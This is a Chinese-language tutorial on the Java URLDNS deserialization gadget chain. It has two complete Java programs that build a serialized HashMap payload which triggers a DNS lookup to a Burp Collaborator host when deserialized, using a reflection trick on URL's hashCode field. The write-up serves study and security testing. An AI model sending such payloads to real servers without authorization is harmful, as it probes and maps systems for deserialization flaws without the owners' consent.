URLDNS链

当目标服务器存在一个反序列化的点时，那么可以通过来URLDNS链，验证服务器存在SSRF

漏洞发现

URL

由于URL类​继承了Serializable​接口，那么就可以进行序列化和反序列化操作

​

但是，发现它重写的readObject​中没有一些其他函数的调用，此时发现这个序列化无法行得通，但是它这个类还重写了其他方法​

​

我们更进这个hashCode()​函数

​

发现它调用了getHostAddress(u)​方法，从函数名字可以看出是一个发起DNS请求的函数，此时触发函数就找到了

现在考虑的问题就是如何调用这个hashCode()​方法

HashMap

找到常用的HashMap​查看其有无重写该方法

​

发现先通过调用hash()​方法，然后在调用它的hashCode()​方法，那么哪里有调用了hashMap​的hash​方法

​

发现它的readObject​调用了hash​方法，最终通过序列化hashMap​就能成功执行hash​方法

构建链路

package URLDNS;

import java.io.*;
import java.net.URL;
import java.util.HashMap;

public class urldns {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        URL url = new URL("http://qf980hetoq8j5rh50ojoc046axgq4msb.oastify.com"); // 创建一个url对象，url通过burp生成
        HashMap<URL, Integer> hashMap = new HashMap<URL,Integer>(); // 通过hashMap创建一个hashMap对象其中键为URL对象类型
        hashMap.put(url, 1); // hashMap在调用put参数时就已经执行了hash函数，这就不是通过序列化执行的hash函数，给人一种时通过反序列化执行的错觉

        serialize(hashMap, "demo.ser"); 
//        Object o = deserialize("demo.ser"); // 通过序列化hashMap调用它的readObject方法中的
    }
    public static void serialize(Object o, String filename) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
        oos.writeObject(o);
        oos.close();
    }

    public static Object deserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object o = ois.readObject();
        return o;
    }
}
​

但是当执行完序列化后发现在burp已经接受到了请求，这里好像出了点问题

​

发现hashMap.put()执行时就已经触发了hash​函数导致在序列化时无法生效

那么我们想要实现 : 在put时，让它无法发起请求，在反序列化时又可以发起请求，这时有需要利用它的一个if条件判断

​

在URL类中存在一个变量hashCode​只有它的值不为-1时才不会执行hashCode()​，在使用反射的时候就可以将它的值进行修改，然后put完成后，再将它的值修改为-1

package URLDNS;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class urldns {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        URL url = new URL("http://r6y9ri5ufrzkws86rpap31v71y7vvojd.oastify.com");
        HashMap<URL, Integer> hashMap = new HashMap<URL,Integer>();
        Class<? extends URL> aClass = url.getClass();
        Field hashCode = aClass.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url, 1234); // 通过反射修改它的值为1234，导致if判断失败，无法执行hashCode()
        hashMap.put(url, 1);
        hashCode.set(url, -1); // put完成后在修改为原先值-1，这样在反序列化时才会执行
        serialize(hashMap, "demo.ser");

//        Object o = deserialize("demo.ser");
//        System.out.println(o);
    }
    public static void serialize(Object o, String filename) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
        oos.writeObject(o);
        oos.close();
    }

    public static Object deserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object o = ois.readObject();
        return o;
    }
}
​

当执行反序列化后，看它是否会触发

成功执行DNS请求

总结

  1. 通过HashMap的readObject()方法执行hash()方法
  2. hash()方法会接收一个参数，就是HashMap的key
  3. 在创建HashMap的时候传入的键类型为URL对象
  4. 而hash()内部又会执行key.HashCode()
  5. 如果这个key是URL类型，则会调用URL类中的hashCode方法
  6. hashCode中存在可以发起请求的方法,导致SSRF执行

其中会存在一个问题就是，在new HahsCode后，需要往其中添加数据，而添加数据的函数是put，这个put也会触发hash函数，此时需要通过反射修改URL类中的hashCode变量的值，让它不为-1（默认是-1）在反序列化之前将它的值改回-1即可成功执行SSRF
